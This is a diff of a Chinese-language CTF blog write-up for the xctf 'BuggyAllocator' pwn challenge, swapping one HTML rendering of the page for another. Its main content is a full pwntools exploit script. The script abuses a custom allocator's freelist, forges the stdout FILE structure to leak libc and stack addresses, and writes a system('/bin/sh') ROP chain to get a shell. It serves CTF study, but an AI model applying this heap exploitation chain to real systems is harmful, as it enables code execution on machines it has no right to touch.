class="comment">#正常取出一个堆块</span></span><br><span class="line">alloc(<span class="number">40</span>,<span class="number">0x38</span>,<span class="string">&#x27;C&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#取出stdout, 使next chunk为 _p_2_1_stdout_</span></span><br><span class="line">alloc(<span class="number">41</span>,<span class="number">0x38</span>,<span class="string">b&#x27;\x80&#x27;</span>) <span class="comment">#覆盖stdout的低位,stdout低位原本就是 \x80</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># pwndbg&gt; p _p_2_1_stdout_</span></span><br><span class="line"><span class="comment"># $2 = &#123;</span></span><br><span class="line"><span class="comment">#   file = &#123;</span></span><br><span class="line"><span class="comment">#     _flags = -72542208,  //0xfbad1800</span></span><br><span class="line"><span class="comment">#     _io_read_ptr = 0x0, </span></span><br><span class="line"><span class="comment">#     _io_read_end = 0x0, </span></span><br><span class="line"><span class="comment">#     _io_read_base = 0x0, </span></span><br><span class="line"><span class="comment">#     _io_write_base = 0x7ffff7dd2600 &lt;_io_2_1_stderr_+192&gt; &#x27;A&#x27; &lt;repeats 32 times&gt;, //低字节修改成了00</span></span><br><span class="line"><span class="comment">#     _io_write_ptr = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131&gt; &quot;\n&quot;, </span></span><br><span class="line"><span class="comment">#     _io_write_end = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131&gt; &quot;\n&quot;, </span></span><br><span class="line"><span class="comment">#     _io_buf_base = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131&gt; &quot;\n&quot;, </span></span><br><span class="line"><span class="comment">#     _io_buf_end = 0x7ffff7dd26a4 &lt;_io_2_1_stdout_+132&gt; &quot;&quot;, </span></span><br><span class="line"><span class="comment">#     _io_save_base = 0x0, </span></span><br><span class="line"><span class="comment">#     _io_backup_base = 0x0, </span></span><br><span class="line"><span class="comment">#     _op_save_end = 0x0, </span></span><br><span class="line"><span class="comment">#     _markers = 0x0, </span></span><br><span class="line"><span class="comment">#     _chain = 0x7ffff7dd18e0 &lt;_p_2_1_stdin_&gt;, </span></span><br><span class="line"><span class="comment">#     _fileno = 1, </span></span><br><span class="line"><span class="comment">#     _flags2 = 0, </span></span><br><span class="line"><span class="comment">#     _old_offset = -1, </span></span><br><span class="line"><span class="comment">#     _cur_column = 0, </span></span><br><span class="line"><span class="comment">#     _vtable_offset = 0 &#x27;\000&#x27;, </span></span><br><span class="line"><span class="comment">#     _shortbuf = &quot;\n&quot;, </span></span><br><span class="line"><span class="comment">#     _lock = 0x7ffff7dd3780 &lt;_p_stdfile_1_lock&gt;, </span></span><br><span class="line"><span class="comment">#     _offset = -1, </span></span><br><span class="line"><span class="comment">#     _codecvt = 0x0, </span></span><br><span class="line"><span class="comment">#     _wide_data = 0x7ffff7dd17a0 &lt;_p_wide_data_1&gt;, </span></span><br><span class="line"><span class="comment">#     _freeres_list = 0x0, </span></span><br><span class="line"><span class="comment">#     _freeres_buf = 0x0, </span></span><br><span class="line"><span class="comment">#     __pad5 = 0, </span></span><br><span class="line"><span class="comment">#     _mode = -1, </span></span><br><span class="line"><span class="comment">#     _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span></span><br><span class="line"><span class="comment">#   &#125;, </span></span><br><span class="line"><span class="comment">#   vtable = 0x7ffff7dd06e0 &lt;_p_file_jumps&gt;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;free&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>]+<span class="number">0x8</span>,elf.got[<span class="string">&#x27;free&#x27;</span>]]) <span class="comment">#伪造_p_2_1_stdout_读取libc地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">42</span>,<span class="number">0x38</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">environ_addr = libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x2a3e6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#释放再取回,伪造_p_2_1_stdout_泄露environ得到栈地址</span></span><br><span class="line">dealloc(<span class="number">42</span>)</span><br><span class="line">payload = flat([<span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,environ_addr,environ_addr+<span class="number">8</span>,environ_addr+<span class="number">8</span>])</span><br><span class="line">alloc(<span class="number">42</span>,<span class="number">0x38</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x140</span></span><br><span class="line">success(<span class="string">f&quot;stack_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用残留数据，布置任意地址写用的堆块</span></span><br><span class="line">dealloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>+p64(stack_addr)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">dealloc(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#尝试分配0x40,由于对应freelist为空,在刚释放的0x80(1号)上建立链表并填充0x40的freelist</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">&#x27;C&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">43</span>,<span class="number">0x40</span>,<span class="string">&#x27;C&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line">alloc(<span class="number">44</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-    </article>
-    <!-- license -->
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+is_debug <span class="token operator">=</span> <span class="token number">1</span>
+IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
+PORT <span class="token operator">=</span> <span class="token number">30708</span>
+
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'idx'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dealloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'idx'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+
+stdout_addr <span class="token operator">=</span> <span class="token number">0x404040</span>
+alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>
+alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xDEADBEAF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>
+
+<span class="token comment">#清空0x80的freelist 使得 arena_end - arena_start &lt; 0x38 这样申请内存就会从0x80的free list中切割然后拿了</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    alloc<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>
+
+<span class="token comment">#释放一个0x80堆块用来建立0x38的freelist</span>
+dealloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
-            <p>Link：<a href="https://nyyyddddn.github.io/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">https://nyyyddddn.github.io/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/</a>
-            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">May 30th 2024, 5:22:56 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">May 30th 2024, 5:24:12 pm</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
+<span class="token comment">#尝试分配0x38,由于对应freelist为空,在刚释放的0x80(0号)上建立链表并填充0x38的freelist</span>
+alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>
+
+<span class="token comment">#正常取出一个堆块</span>
+alloc<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>
+
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/06/04/litctf2024-pwn/" title="litctf2024_pwn">
-                    <div class="nextTitle">litctf2024_pwn</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2024/05/27/DragonKnightCTF-pwn/" title="DragonKnightCTF_pwn">
-                    <div class="prevTitle">DragonKnightCTF_pwn</div>
-                </a>
-            
-        </li>
+<span class="token comment">#取出stdout, 使next chunk为 _p_2_1_stdout_</span>
+alloc<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x80'</span><span class="token punctuation">)</span> <span class="token comment">#覆盖stdout的低位,stdout低位原本就是 \x80</span>
+    
+<span class="token comment"># pwndbg> p _p_2_1_stdout_</span>
+<span class="token comment"># $2 = &#123;</span>
+<span class="token comment">#   file = &#123;</span>
+<span class="token comment">#     _flags = -72542208,  //0xfbad1800</span>
+<span class="token comment">#     _io_read_ptr = 0x0, </span>
+<span class="token comment">#     _io_read_end = 0x0, </span>
+<span class="token comment">#     _io_read_base = 0x0, </span>
+<span class="token comment">#     _io_write_base = 0x7ffff7dd2600 &lt;_io_2_1_stderr_+192> 'A' &lt;repeats 32 times>, //低字节修改成了00</span>
+<span class="token comment">#     _io_write_ptr = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
+<span class="token comment">#     _io_write_end = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
+<span class="token comment">#     _io_buf_base = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
+<span class="token comment">#     _io_buf_end = 0x7ffff7dd26a4 &lt;_io_2_1_stdout_+132> "", </span>
+<span class="token comment">#     _io_save_base = 0x0, </span>
+<span class="token comment">#     _io_backup_base = 0x0, </span>
+<span class="token comment">#     _op_save_end = 0x0, </span>
+<span class="token comment">#     _markers = 0x0, </span>
+<span class="token comment">#     _chain = 0x7ffff7dd18e0 &lt;_p_2_1_stdin_>, </span>
+<span class="token comment">#     _fileno = 1, </span>
+<span class="token comment">#     _flags2 = 0, </span>
+<span class="token comment">#     _old_offset = -1, </span>
+<span class="token comment">#     _cur_column = 0, </span>
+<span class="token comment">#     _vtable_offset = 0 '\000', </span>
+<span class="token comment">#     _shortbuf = "\n", </span>
+<span class="token comment">#     _lock = 0x7ffff7dd3780 &lt;_p_stdfile_1_lock>, </span>
+<span class="token comment">#     _offset = -1, </span>
+<span class="token comment">#     _codecvt = 0x0, </span>
+<span class="token comment">#     _wide_data = 0x7ffff7dd17a0 &lt;_p_wide_data_1>, </span>
+<span class="token comment">#     _freeres_list = 0x0, </span>
+<span class="token comment">#     _freeres_buf = 0x0, </span>
+<span class="token comment">#     __pad5 = 0, </span>
+<span class="token comment">#     _mode = -1, </span>
+<span class="token comment">#     _unused2 = '\000' &lt;repeats 19 times></span>
+<span class="token comment">#   &#125;, </span>
+<span class="token comment">#   vtable = 0x7ffff7dd06e0 &lt;_p_file_jumps></span>
+<span class="token comment"># &#125;</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#伪造_p_2_1_stdout_读取libc地址</span>
+
+<span class="token comment"># gdb.attach(p)</span>
+alloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
+success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+environ_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
+pop_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e5</span>
+ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e6</span>
+
+<span class="token comment">#释放再取回,伪造_p_2_1_stdout_泄露environ得到栈地址</span>
+dealloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>environ_addr<span class="token punctuation">,</span>environ_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>environ_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+alloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x140</span>
+success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_addr -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token comment">#利用残留数据，布置任意地址写用的堆块</span>
+dealloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>
+dealloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    
+<span class="token comment">#尝试分配0x40,由于对应freelist为空,在刚释放的0x80(1号)上建立链表并填充0x40的freelist</span>
+alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>
+
+alloc<span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+alloc<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+	  <div class="article-footer-copyright">
+	Ciallo～(∠・ω< )⌒★
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/06/04/litctf2024-pwn/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/05/27/DragonKnightCTF-pwn/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-05-30 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
     </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
+	</div>
+		
 
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
 
-            
+		
 
-            
+	</div>
+	
+		
 
-            
+</div><!-- row -->
 
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
+<!--
+ -->
 
 
 
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 nyyyddddn's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
 
 
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
 
 
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">xctf_BuggyAllocator复现</span></a></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
